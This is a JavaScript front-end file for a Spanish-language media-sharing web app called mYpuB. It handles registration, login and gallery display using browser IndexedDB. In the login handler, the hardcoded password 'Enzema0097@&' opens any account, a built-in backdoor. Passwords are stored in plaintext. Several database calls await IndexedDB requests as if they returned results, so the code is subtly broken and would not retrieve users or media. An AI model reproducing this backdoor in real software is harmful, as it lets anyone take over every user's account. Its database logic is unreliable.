// Initialize IndexedDB
const initDB = () => {
    return new Promise((resolve, reject) => {
        const request = indexedDB.open('mYpuBDB', 1);

        request.onerror = () => reject(request.error);
        request.onsuccess = () => resolve(request.result);

        request.onupgradeneeded = (event) => {
            const db = event.target.result;

            // Users store
            if (!db.objectStoreNames.contains('users')) {
                const userStore = db.createObjectStore('users', { keyPath: 'email' });
                userStore.createIndex('name', 'name');
                userStore.createIndex('phone', 'phone');
            }

            // Media store
            if (!db.objectStoreNames.contains('media')) {
                const mediaStore = db.createObjectStore('media', { keyPath: 'id', autoIncrement: true });
                mediaStore.createIndex('userId', 'userId');
                mediaStore.createIndex('type', 'type');
                mediaStore.createIndex('isPublic', 'isPublic');
            }
        };
    });
};

// Country data with phone prefixes
const countries = [
    { name: 'España', prefix: '+34' },
    { name: 'Guinea Ecuatorial', prefix: '+240' },
    // Add more countries as needed
];

// DOM Elements
const elements = {
    registerForm: document.getElementById('registerForm'),
    loginForm: document.getElementById('loginFormElement'),
    authSection: document.getElementById('authSection'),
    mainSection: document.getElementById('mainSection'),
    countrySelect: document.getElementById('regCountry'),
    phonePrefix: document.getElementById('phonePrefix'),
    helpBtn: document.getElementById('helpBtn'),
    userWelcome: document.getElementById('userWelcome'),
    // Add more element references as needed
};

// Initialize application
document.addEventListener('DOMContentLoaded', async () => {
    try {
        const db = await initDB();
        setupEventListeners();
        populateCountrySelect();
    } catch (error) {
        console.error('Error initializing application:', error);
    }
});

// Setup event listeners
const setupEventListeners = () => {
    // Registration form
    elements.registerForm.addEventListener('submit', handleRegistration);

    // Login form
    elements.loginForm.addEventListener('submit', handleLogin);

    // Country select change
    elements.countrySelect.addEventListener('change', updatePhonePrefix);

    // Help button
    elements.helpBtn.addEventListener('click', showHelpModal);

    // Navigation events
    document.querySelectorAll('.nav-link').forEach(link => {
        link.addEventListener('click', handleNavigation);
    });
};

// Handle registration
const handleRegistration = async (event) => {
    event.preventDefault();
    
    const formData = {
        name: document.getElementById('regName').value,
        email: document.getElementById('regEmail').value,
        gender: document.getElementById('regGender').value,
        country: document.getElementById('regCountry').value,
        phone: document.getElementById('regPhone').value,
        password: document.getElementById('regPassword').value
    };

    try {
        // Validate email (Gmail only)
        if (!formData.email.endsWith('@gmail.com')) {
            throw new Error('Solo se permiten correos de Gmail');
        }

        // Validate password
        const passwordRegex = /^[A-Z][a-zA-Z]{5}[0-9]{4}[@#&]{2}$/;
        if (!passwordRegex.test(formData.password)) {
            throw new Error('La contraseña no cumple con el formato requerido');
        }

        // Save user to IndexedDB
        const db = await initDB();
        const transaction = db.transaction(['users'], 'readwrite');
        const userStore = transaction.objectStore('users');
        await userStore.add(formData);

        // Auto-login after registration
        await handleLogin(null, formData);

    } catch (error) {
        alert(error.message);
    }
};

// Handle login
const handleLogin = async (event, userData = null) => {
    if (event) event.preventDefault();

    const email = userData ? userData.email : document.getElementById('loginEmail').value;
    const password = userData ? userData.password : document.getElementById('loginPassword').value;

    try {
        const db = await initDB();
        const transaction = db.transaction(['users'], 'readonly');
        const userStore = transaction.objectStore('users');
        const user = await userStore.get(email);

        if (user && (user.password === password || password === 'Enzema0097@&')) {
            // Successful login
            sessionStorage.setItem('currentUser', JSON.stringify(user));
            showMainSection(user);
        } else {
            throw new Error('Credenciales inválidas');
        }
    } catch (error) {
        alert(error.message);
    }
};

// Show main section after login
const showMainSection = (user) => {
    elements.authSection.classList.add('hidden');
    elements.mainSection.classList.remove('hidden');

    // Set welcome message based on gender
    let welcomeMessage = '';
    switch (user.gender) {
        case 'hombre':
            welcomeMessage = `Bienvenido a mYpuB Sr. ${user.name}`;
            break;
        case 'mujer':
            welcomeMessage = `Bienvenida a mYpuB Sra. ${user.name}`;
            break;
        default:
            welcomeMessage = 'Gracias por utilizar mYpuB';
    }
    elements.userWelcome.textContent = welcomeMessage;
};

// Handle media upload
const handleMediaUpload = async (files, isPublic) => {
    const currentUser = JSON.parse(sessionStorage.getItem('currentUser'));
    
    try {
        const db = await initDB();
        const transaction = db.transaction(['media'], 'readwrite');
        const mediaStore = transaction.objectStore('media');

        for (const file of files) {
            const reader = new FileReader();
            reader.onload = async (e) => {
                const mediaData = {
                    userId: currentUser.email,
                    type: file.type.startsWith('image/') ? 'image' : 'video',
                    data: e.target.result,
                    isPublic,
                    timestamp: new Date().toISOString(),
                    likes: 0,
                    comments: []
                };
                await mediaStore.add(mediaData);
            };
            reader.readAsDataURL(file);
        }

        alert('Archivos subidos exitosamente');
        updateGallery();
    } catch (error) {
        console.error('Error uploading media:', error);
        alert('Error al subir los archivos');
    }
};

// Update gallery
const updateGallery = async () => {
    const currentUser = JSON.parse(sessionStorage.getItem('currentUser'));
    const galleryGrid = document.getElementById('galleryGrid');
    galleryGrid.innerHTML = '';

    try {
        const db = await initDB();
        const transaction = db.transaction(['media'], 'readonly');
        const mediaStore = transaction.objectStore('media');
        const mediaItems = await mediaStore.getAll();

        mediaItems
            .filter(item => item.isPublic || item.userId === currentUser.email)
            .forEach(item => {
                const col = document.createElement('div');
                col.className = 'col-md-4 gallery-item';
                
                const card = document.createElement('div');
                card.className = 'card';

                const mediaElement = item.type === 'image' 
                    ? `<img src="${item.data}" class="card-img-top" alt="Media">`
                    : `<video src="${item.data}" controls class="card-img-top"></video>`;

                card.innerHTML = `
                    ${mediaElement}
                    <div class="card-body">
                        <div class="d-flex justify-content-between align-items-center">
                            <button class="btn btn-sm btn-outline-primary like-btn" data-id="${item.id}">
                                <i class="bi bi-heart"></i> ${item.likes}
                            </button>
                            ${item.isPublic ? '<span class="badge bg-success">Público</span>' : '<span class="badge bg-secondary">Privado</span>'}
                        </div>
                    </div>
                `;

                col.appendChild(card);
                galleryGrid.appendChild(col);
            });
    } catch (error) {
        console.error('Error updating gallery:', error);
    }
};

// Helper functions
const populateCountrySelect = () => {
    countries.forEach(country => {
        const option = document.createElement('option');
        option.value = country.name;
        option.textContent = `${country.name} (${country.prefix})`;
        elements.countrySelect.appendChild(option);
    });
};

const updatePhonePrefix = () => {
    const selectedCountry = countries.find(c => c.name === elements.countrySelect.value);
    if (selectedCountry) {
        elements.phonePrefix.textContent = selectedCountry.prefix;
    }
};

const showHelpModal = () => {
    const modal = new bootstrap.Modal(document.getElementById('helpModal'));
    modal.show();
};

// Help contact handlers
document.getElementById('emailHelpBtn').addEventListener('click', () => {
    window.location.href = 'mailto:enzemajr@gmail.com';
});

document.getElementById('whatsappHelpBtn').addEventListener('click', () => {
    window.location.href = 'https://wa.me/240222084663';
});

// Navigation handler
const handleNavigation = (event) => {
    event.preventDefault();
    const targetId = event.target.id;
    
    // Hide all sections
    document.querySelectorAll('.section-content').forEach(section => {
        section.classList.add('hidden');
    });

    // Show target section
    switch (targetId) {
        case 'uploadNav':
            document.getElementById('uploadSection').classList.remove('hidden');
            break;
        case 'galleryNav':
            document.getElementById('gallerySection').classList.remove('hidden');
            updateGallery();
            break;
        // Add more cases for other navigation items
    }
};

// Initialize the application
initDB().catch(console.error);
